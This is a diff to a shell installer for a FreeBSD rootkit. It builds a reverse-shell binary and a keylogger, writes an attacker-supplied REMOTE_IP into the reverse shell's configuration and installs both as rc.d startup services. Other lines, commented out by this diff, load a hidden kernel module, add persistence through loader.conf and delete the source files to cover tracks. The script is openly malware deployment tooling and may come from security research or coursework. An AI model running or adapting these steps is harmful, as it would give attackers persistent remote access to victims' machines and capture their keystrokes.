@@ -47,21 +47,21 @@ cat << "EOF"
 
 EOF
 
-cd $KMOD
+# cd $KMOD
 
-echo ">> Clean existing build."
-make clean
+# echo ">> Clean existing build."
+# make clean
 
-echo ">> Build rootkit."
-make
+# echo ">> Build rootkit."
+# make
 
-echo ">> Install rootkit kernel module."
+# echo ">> Install rootkit kernel module."
 
-echo ""$NAME"_load=\"YES\"" > $LOADER_CONF
-touch $LOADER_CONF_TRANSPARENT
+# echo ""$NAME"_load=\"YES\"" > $LOADER_CONF
+# touch $LOADER_CONF_TRANSPARENT
 
-mv $KMOD/$KO $INSTALL/$KO
-kldload $INSTALL/$KO
+# mv $KMOD/$KO $INSTALL/$KO
+# kldload $INSTALL/$KO
 
 cd $BINARIES
 
@@ -69,10 +69,10 @@ echo ">> Clean existing binary build."
 make clean
 
 echo ">> Compile rshell binary."
-make rshell
+make rshell_target
 
 echo ">> Compile keylog binary."
-make keylog
+make keylog_target
 
 echo ">> Editing rshell conf file to contain REMOTE_IP=${REMOTE_IP}."
 sed -i '' "s|${USR_SBIN}${RSHELL}|${USR_SBIN}${RSHELL} ${REMOTE_IP}|g" $BINARIES/$RSHELL_CONF_FILE
@@ -98,10 +98,10 @@ mv $BINARIES/$RSHELL_CONF_FILE $RC_INSTALL_LOCATION
 echo ">> Move keylog configuration file into /etc/rc.d."
 mv $BINARIES/$KEYLOG_CONF_FILE $RC_INSTALL_LOCATION
 
-if [ "$2" = "DEBUG" ]
-then
-        echo ">> Ignore source files."
-else
-	echo ">> Purge source files."
-	rm -rf $SRC
-fi
+# if [ "$2" = "DEBUG" ]
+# then
+#         echo ">> Ignore source files."
+# else
+# 	echo ">> Purge source files."
+# 	rm -rf $SRC
+# fi
